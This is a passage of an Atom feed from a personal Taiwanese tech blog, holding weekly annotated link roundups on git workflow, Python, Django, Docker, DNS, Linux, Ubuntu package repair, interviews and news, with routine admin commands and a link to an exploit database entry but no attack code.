&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Never Push to Master  &lt;ul&gt;
&lt;li&gt;Always push to a separate branch per logical unit (story, feature, bug, optimisation, refactor, improvement). Branches are easy to make and easy to merge when you use git (and you apply some of tips further down in this post).  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Never Merge Your Own Branch  &lt;ul&gt;
&lt;li&gt;This helps to ensures that code is in fact reviewed. If you are caught merging into master, you will order pizza for the whole team.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Review Work in Progress First  &lt;ul&gt;
&lt;li&gt;When you are finished with a task, you notify the other team members that your work is ready for final review. Then you review existing branches. Before picking up a new task, you look at all open pull requests (including unfinished ones) and review the changes since the last time you checked.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Merge responsibly  &lt;ul&gt;
&lt;li&gt;Merging a pull request is the responsibility of the whole team. A pull request can not be merged when someone in the team does not understand the code or the reasoning, or does not agree with the solution.&lt;br /&gt;
(Note that these rules are starting points. Figure out what works in your team, adapt continuously.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://eli.thegreenplace.net/2012/01/24/distributed-computing-in-python-with-multiprocessing/"&gt;Distributed computing in Python with multiprocessing - Eli Bendersky's webs&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有個在史丹佛唸天文物理的高中同學問了這方面的問題，因為涉獵不多，所以就查了一下資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/10/httpstat-log-dns-lookup-to-download-time-2016/"&gt;httpstat 分析 從 DNS查詢 到 下載完成 各個階段的處理時間&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像不錯用  &lt;/li&gt;
&lt;li&gt;裝來用以後真的還不錯耶，結果顯示是這樣的：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ httpstat blog.m157q.tw/get  
Connected to &lt;span class="m"&gt;104&lt;/span&gt;.18.38.201:80 from &lt;span class="m"&gt;192&lt;/span&gt;.168.43.139:44650  

HTTP/1.1 &lt;span class="m"&gt;301&lt;/span&gt; Moved Permanently  
Date: Sat, &lt;span class="m"&gt;26&lt;/span&gt; Nov &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:01:00 GMT  
Transfer-Encoding: chunked  
Connection: keep-alive  
Set-Cookie: &lt;span class="nv"&gt;__cfduid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;d090501284dc193137b69492e0e58d8801480122059&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;expires&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Sun, &lt;span class="m"&gt;26&lt;/span&gt;-Nov-17 &lt;span class="m"&gt;01&lt;/span&gt;:00:59 GMT&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;.m157q.tw&lt;span class="p"&gt;;&lt;/span&gt; HttpOnly  
Location: https://blog.m157q.tw/get  
Server: cloudflare-nginx  
CF-RAY: 3079681ae007538a-LAX  

Body stored in: /tmp/tmpn6p4a94e  

  DNS Lookup   TCP Connection   Server Processing   Content Transfer  
&lt;span class="o"&gt;[&lt;/span&gt;    253ms   &lt;span class="p"&gt;|&lt;/span&gt;      365ms     &lt;span class="p"&gt;|&lt;/span&gt;       324ms       &lt;span class="p"&gt;|&lt;/span&gt;        0ms       &lt;span class="o"&gt;]&lt;/span&gt;  
             &lt;span class="p"&gt;|&lt;/span&gt;                &lt;span class="p"&gt;|&lt;/span&gt;                   &lt;span class="p"&gt;|&lt;/span&gt;                  &lt;span class="p"&gt;|&lt;/span&gt;  
    namelookup:253ms          &lt;span class="p"&gt;|&lt;/span&gt;                   &lt;span class="p"&gt;|&lt;/span&gt;                  &lt;span class="p"&gt;|&lt;/span&gt;  
                        connect:618ms             &lt;span class="p"&gt;|&lt;/span&gt;                  &lt;span class="p"&gt;|&lt;/span&gt;  
                                      starttransfer:942ms            &lt;span class="p"&gt;|&lt;/span&gt;  
                                                                 total:942ms  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href="http://flake8.pycqa.org/en/latest/release-notes/3.0.0.html"&gt;3.0.0 – 2016-07-25 — flake8 3.1.0.dev0 documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;flake8 3.0.0 開始不再完全支援 Python 2.6, 3.2, 3.3  &lt;/li&gt;
&lt;li&gt;會遇到這個主要是送 &lt;a href="https://github.com/jmcarp/robobrowser/pull/56"&gt;robobrowser 的 PR&lt;/a&gt; 的時候遇到 CI testing failed 才去查的。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gitlab.com/pycqa/flake8/issues/187"&gt;flake8 fails to work as it used to be on python 2.6.9 (#187) ‧ Issues ‧ PyC&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/11754877/troubleshooting-related-field-has-invalid-lookup-icontains"&gt;exception - Troubleshooting "Related Field has invalid lookup: icontains" - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;寫 Django 時遇到的問題，要在 Django 的 &lt;code&gt;admin.ModelAdmin&lt;/code&gt; 使用 foreign key field 時，必須使用兩個 underscore。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sshwsfc/xadmin"&gt;GitHub - sshwsfc/xadmin: Drop-in replacement of Django admin comes with lots of goodies, fully extensible with plugin support, pretty UI based on Twitter Bootstrap.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就一個幫你把 Django Admin 整合 Twitter Bootstrap 的 framework  &lt;/li&gt;
&lt;li&gt;公司的專案有用到，紀錄一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.exploit-db.com/exploits/40680/"&gt;PCMan FTP Server 2.0.7 - 'UMASK' Command Buffer Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 PCMan 連 FTP server 都有寫...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://joe-dev.blogspot.tw/2016/11/vim.html"&gt;閒聊：使用 Vim 編輯器的第五年&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;想想自己從高一第一次用 Vim 到現在，好像也過了 8 年了...  &lt;/li&gt;
&lt;li&gt;但其實一直沒有什麼時間去刻意提升自己使用 Vim 的效率，也沒寫過 Vim Plugin  &lt;/li&gt;
&lt;li&gt;從一開始抄 xatier 跟凍仁翔的 vimrc 來用  &lt;/li&gt;
&lt;li&gt;到大一下開始用 Vundle 裝了些 plugin 來用  &lt;/li&gt;
&lt;li&gt;到大學畢業後又重新整理一次自己真正需要用到的 Vim plugin 和一併整理 vimrc  &lt;/li&gt;
&lt;li&gt;很多更快捷的按法其實我都沒有真的拿來用  &lt;/li&gt;
&lt;li&gt;也許哪天會突然想卯起來研究一下吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.google.com/maps/d/u/0/viewer?mid=11yl4gOQPCqLQGVoHlwjy6zcOK70&amp;amp;ll=23.497499078229865%2C120.74966884140622&amp;amp;z=9"&gt;台灣文化資產失火、破壞列表&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;古跡自燃定律實證紀錄。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mhperng.blogspot.com/2016/10/4.html"&gt;「願景會社」（4）：白色力量的集結、獨立與傳承&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯，有些沒想過的觀點，值得用不同的角度來思考一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;skating&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.xuite.net/kk915021/twblog/88227780-%E8%AA%8D%E8%AD%98%E5%9F%B9%E6%9E%97~~~"&gt;認識培林~~~ @ Cycling Life :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;今年的生日禮物是買個新台幣一千塊有找的交通板來玩玩，所以查了一些跟滑板相關的資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.twreporter.org/a/opinion-south-koreans-urge-president-to-resign"&gt;楊虔豪／見證首爾街頭的百萬大軍　南韓倒朴的關鍵時刻&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這真的可以直接下台了吧 感覺只會愈來愈難看而已 (?)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.twreporter.org/a/opinion-who-vote-for-trump"&gt;王茜穎／為什麼這麼多小鎮鎮民支持川普？──從城鄉差距看美國大選&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;美國的兩極化真的是挺嚴重的啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://clickme.net/37163"&gt;【專區】搞笑達人ARuFa文章總整理，讓你笑到腹筋狂抽筋！ | 點我一下 分享無價&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;ARuFa 的無厘頭總是能讓人歡笑  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.thenewslens.com/article/53004"&gt;台灣九成無法進食的病患會被放上鼻胃管，歐美卻大多拒絕，為什麼？ - The News Lens 關鍵評論網&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;醫師寫的文章，最後一段關於鼻胃管的迷思值得看一下。  &lt;/li&gt;
&lt;li&gt;覺得滿重要的，所以引述一下：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;迷思一、一定是因為營養不好，沒有體力，病才不會好！  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;這是非常常見的觀念，然而，對於末期病人而言，他們體力的衰弱往往都來自於本身的疾病逐漸惡化，如癌症、糖尿病、腎衰竭等等。再多的營養進去，其實身體也無法吸收。甚至反而太多營養和水分會造成身體多餘的負擔，產生全身水腫、腹水等等，使得病患更不舒服。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;迷思二、沒有放鼻胃管，病人會因為沒有進食提早走掉  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;國外的研究已經有證實，有沒有放置鼻胃管和生命的長短其實沒有必然的關係，反而我們應該更注重的是病人自己的選擇和生活的品質。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;迷思三、鼻胃管是除了經口進食以外最好的營養給予方式  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;還有另一種更不會讓病患感到不舒服的方式：胃造口，也是在胃部置放一條管子直接灌食，這個方式不僅會比較舒適，同時在照顧上也比較方便，但是因為一般民眾仍覺得這樣的方法比較具侵入性，所以通常抱持著排斥的態度。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其實，鼻胃管是一個很棒的發明，讓暫時無法由口進食的病人（如外科病人）能夠短暫地借助管子持續得到營養。畢竟，由腸胃道吸收營養，依然是比較優先的選擇。只是很多時候，它可能被濫用了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;</summary><category term="django"></category><category term="interview"></category><category term="javascript"></category><category term="joke"></category><category term="math"></category><category term="misc"></category><category term="news"></category><category term="opensource"></category><category term="programmer"></category><category term="programming"></category><category term="python"></category><category term="security"></category><category term="skating"></category><category term="taiwan"></category><category term="vim"></category></entry><entry><title>Y2016W44</title><link href="https://blog.m157q.tw/posts/2016/11/07/y2016w44/" rel="alternate"></link><published>2016-11-26T02:30:59+08:00</published><updated>2016-11-26T02:30:59+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-11-07:posts/2016/11/07/y2016w44/</id><summary type="html">&lt;h3&gt;apache&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最近在阿里雲上架 server，要弄 https，所以查了一下很有名但我還沒用過 Let's Encrypt，但在阿里雲上要從 pip 安裝 cerbot 需要的 Python 套件的時候被擋了，所以沒有用上。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://hallard.me/enable-ssl-for-apache-server-in-5-minutes/"&gt;Enable SSL for apache server in 5 minutes – Charles's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://certbot.eff.org/#osx-nginx"&gt;Certbot&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/how-to-secure-apache-with-let-s-encrypt-on-ubuntu-14-04"&gt;How To Secure Apache with Let's Encrypt on Ubuntu 14.04 | DigitalOcean&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;chrome&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/erkserkserks/h264ify"&gt;erkserkserks/h264ify: A Chrome extension that makes YouTube stream H.264 videos instead of VP8/VP9 videos&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個可以讓 YouTube 強制改用 H.264 的 Chrome 套件，看影片的速度會比較快一些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cloud, china&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;因為最近在弄客戶在中國網站的問題，所以 survey 了一些中國提供 Cloud Service 的廠商比較  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/26290516"&gt;青云、UCloud、阿里云、腾讯云等分别都有哪些特点？ - 云计算 - 知乎&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sudops.com/ucloud-experience-vs-aliyun-aws.html"&gt;对比阿里云和 AWS，亲身体验 Ucloud - 运维 · 速度 | 运维 · 速度&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;container&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jvns.ca/blog/2016/10/02/a-list-of-container-software/"&gt;A list of Linux container software&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一篇小文章蒐集和 container 有關的軟體清單  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最近開始用 Django 在 Apache 上架 web server，所以查了一些相關的文章  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/how-to-serve-django-applications-with-uwsgi-and-nginx-on-ubuntu-14-04"&gt;How To Serve Django Applications with uWSGI and Nginx on Ubuntu 14.04 | Dig&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-an-apache-mysql-and-python-lamp-server-without-frameworks-on-ubuntu-14-04"&gt;How To Set Up an Apache, MySQL, and Python (LAMP) Server Without Frameworks&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/1.10/howto/deployment/wsgi/modwsgi/"&gt;How to use Django with Apache and mod_wsgi | Django documentation | Django&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/community/tutorials/how-to-serve-django-applications-with-apache-and-mod_wsgi-on-ubuntu-14-04"&gt;How To Serve Django Applications with Apache and mod_wsgi on Ubuntu 14.04 |&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://askubuntu.com/questions/569550/assertionerror-using-apache2-and-libapache2-mod-wsgi-py3-on-ubuntu-14-04-python"&gt;AssertionError using Apache2 and libapache2-mod-wsgi-py3 on Ubuntu 14.04 (P&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;dns&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://xip.io/"&gt;xip.io: wildcard DNS for everyone&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個只要有 Public IP 就可使用的免費 DNS server  &lt;ul&gt;
&lt;li&gt;例如 Public IP 是 &lt;code&gt;10.0.0.1&lt;/code&gt; 的話，可以直接用 &lt;code&gt;10.0.0.1.xip.io&lt;/code&gt; 當 domain name  &lt;/li&gt;
&lt;li&gt;在一些一定得使用 domain name，不能直接使用 Public IP 的場合可以派上用場  &lt;/li&gt;
&lt;li&gt;官網的說明就滿簡單易懂的了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/basecamp/xip-pdns"&gt;GitHub - basecamp/xip-pdns: PowerDNS pipe backend adapter powering xip.io&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來是用 bash 寫了一個 PowerDNS 的 wrapper 的樣子  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原本是要拿來解決公司客戶處理中國那邊的問題需要 HTTPS 連線，但又沒有個合法備案的 Domain name 可以使用，所以想找看看有沒有免費的能用，找到了這個。  &lt;ul&gt;
&lt;li&gt;但後來嘗試了一下發現行不通，會直接在阿里雲上被擋掉，顯示「這個域名沒有備案」之類的訊息。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://thehftguy.wordpress.com/2016/11/01/docker-in-production-an-history-of-failure/"&gt;Docker in Production: A History of Failure – The HFT Guy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Docker 用來快速建立測試環境非常方便，但要直接使用在 Production 的環境上卻是有非常多的細節需要注意。  &lt;/li&gt;
&lt;li&gt;這篇文章詳細紀錄了許多作者在工作上於 Production 環境使用 Docker 踩到的許多雷，我覺得挺值得參考的。  &lt;ul&gt;
&lt;li&gt;各個版本不相容的問題  &lt;/li&gt;
&lt;li&gt;無法很簡單的把舊的 Images 清掉  &lt;ul&gt;
&lt;li&gt;這裡指的像是用一個指令就把已經建立 X 天以上或者已經 X 天未被使用的 Images 清掉  &lt;/li&gt;
&lt;li&gt;也因為這樣，所以非常吃硬碟的空間。  &lt;/li&gt;
&lt;li&gt;比較折衷的作法就是把 &lt;code&gt;docker images -q -a | xargs --no-run-if-empty docker rmi&lt;/code&gt; 寫在 crontab 讓電腦每天執行這個指令一次。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺乏 Kernel 相關支援  &lt;ul&gt;
&lt;li&gt;Linux 3.X: storage driver 不穩定  &lt;/li&gt;
&lt;li&gt;Linux 4.X: Kernel 正式放棄支援 Docker  &lt;ul&gt;
&lt;li&gt;AUFS 直接從 Linux 4.X 以後的版本消失了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為 AUFS 在 Linux 4.X 不會動，所以有人寫了個 OverlayFS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OverlayFS 存在許多缺點  &lt;ul&gt;
&lt;li&gt;因為是在一年內打造出來的，而要在一年內打造出一個完好的 Filesystem 基本上是一個不可能的任務，所以後來又有了 Overlay2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Overlay2 只支援 Linux Kernel 4.X 以上及 Docker 1.12 以上  &lt;/li&gt;
&lt;li&gt;... （實在太多了）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1478010654.A.9A6.html"&gt;[心得] 歐洲 Facebook、Google、Booking 面試 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;給出了滿多中肯的建議。  &lt;/li&gt;
&lt;li&gt;還是一貫的，每次看別人的面試經驗都覺得自己實在太廢了，不知道什麼時候才能讓自己看到別人的面試經驗以後覺得自己也還算不錯。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.brucefeng.info/post/some-about-interview"&gt;互联网公司校招的一些感受&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者寫出在學校徵才的時候看到的一些現象與問題  &lt;ul&gt;
&lt;li&gt;比如說有些應徵者極度的沒自信，會讓徵才者有點尷尬，甚至覺得是不是因為應徵者本身的問題導致之前面試都碰壁，才會顯的如此沒有自信之類的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;作者認為重要的 3 個部份：學習能力、溝通能力、技術基礎  &lt;/li&gt;
&lt;li&gt;最後也給出了一些建議  &lt;ul&gt;
&lt;li&gt;放輕鬆  &lt;/li&gt;
&lt;li&gt;事先瞭解要面試的公司背景及職位背景  &lt;/li&gt;
&lt;li&gt;刷題固然重要，但有自己的思路更重要。刷完題之後應該要讓自己好好思考有沒有不同的解法之類的。  &lt;/li&gt;
&lt;li&gt;實習工作要找和以後工作相關的，否則以後找工作的時候，不相關的實習經歷基本上是沒什麼用的。  &lt;/li&gt;
&lt;li&gt;面試結果的問題問 HR，不要問面試官。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2016/10/05/%e5%88%9d%e6%8e%a2-linux-kernel-%e4%ba%82%e6%95%b8%e7%94%a2%e7%94%9f%e5%99%a8-random-generator/"&gt;初探 Linux kernel 亂數產生器 – random generator&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;介紹了四種亂數產生器的 interface，覺得挺有趣的。  &lt;ol&gt;
&lt;li&gt;&lt;code&gt;/dev/random&lt;/code&gt; (blocking random source) – 位於 &lt;code&gt;drivers/char/random.c&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/dev/urandom&lt;/code&gt; (non-blocking random source)– 位於 &lt;code&gt;drivers/char/random.c&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;system call &lt;code&gt;getrandom()&lt;/code&gt; (kernel 3.17 之後開始支援) – 位於 &lt;code&gt;drivers/char/random.c&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/dev/hwrng&lt;/code&gt; – 位於 &lt;code&gt;drivers/char/hw_random&lt;/code&gt; 並需要硬體元件支援  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;距離上次作 MySQL db migration 有點久了，所以有點忘記要做哪些事情，查了一下。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://webcheatsheet.com/sql/mysql_backup_restore.php"&gt;How to Back Up and Restore a MySQL Database&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://dba.stackexchange.com/questions/94552/mysqldump-doesnt-restore-database-why-not"&gt;mysql - mysqldump doesn't restore database. why not? - Database Administrat&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/7475223/mysql-config-not-found-when-installing-mysqldb-python-interface"&gt;linux - mysql_config not found when installing mysqldb python interface - S&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://seanlin.logdown.com/archives"&gt;Archive « Python Life&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這位作者在一年前花了好多時間翻譯和寫了很多跟 Python 有關的文章，但後來就不見哩。想說 bookmark 一下文章列表。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://seanlin.logdown.com/posts/239771-use-flask-to-create-restful-api"&gt;用 Flask 打造 RESTful API « Python Life&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cgoldberg/xvfbwrapper"&gt;cgoldberg/xvfbwrapper: Python wrapper for running a display inside X virtual framebuffer (Xvfb)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;給沒有 X window 的 Server 用的 Xvfb Python wrapper，主要是 &lt;code&gt;dryscrape&lt;/code&gt; 有用到，但因為遇到些錯誤訊息，所以查了一下。  &lt;/li&gt;
&lt;li&gt;沒記錯的話是得安裝 xvfb 的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ubuntu&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://askubuntu.com/questions/410045/the-package-lists-or-status-file-could-not-be-parsed-or-opened"&gt;apt - "The package lists or status file could not be parsed or opened" - As&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Ubuntu Server 不知為啥就遇到這個問題，解法長這樣：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo mv /var/lib/dpkg/status /var/lib/dpkg/status.bad  
sudo cp /var/lib/dpkg/status-old /var/lib/dpkg/status  
sudo apt-get update  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看來應該是 dpkg 的 status 紀錄的部份有點問題，&lt;br /&gt;
所以拿上一次成功的 status 來用。  &lt;/p&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/junegunn/vim-emoji"&gt;junegunn/vim-emoji: Emoji in Vim&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個可以讓你在 Vim 裏面直接使用 emoji 的 plugin  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;批踢踢&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/MLB/M.1478177239.A.6AF.html"&gt;[閒聊] 預言成真？！ - 看板 MLB - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這兩個預言小熊隊會在 2016 年拿下世界大賽冠軍實在是太猛了，尤其是第二個，實在是預言得詳細到讓人覺得是未來人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;news&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.twreporter.org/a/opinion-who-vote-for-trump"&gt;王茜穎／為什麼這麼多小鎮鎮民支持川普？──從城鄉差距看美國大選&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「這些藍色城市僅佔美國國土的3.5%，卻有近63%的人口，選出了歐巴馬。而包圍城市的廣大紅海，佔據96.5%美國面積的非都市地區，近4成的人口，傾向支持共和黨。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.youtube.com/watch?v=CY8LD9er7lE"&gt;國家地理頻道 洪水來臨前 BEFORE THE FLOOD - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;李奧納多迪卡皮歐出錢拍的紀錄片。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.keybr.com/"&gt;Typing speed test, advanced typing lessons, practice touch typing, typing e&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個會幫你分析打每個鍵的速度及錯誤率的打字網站。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
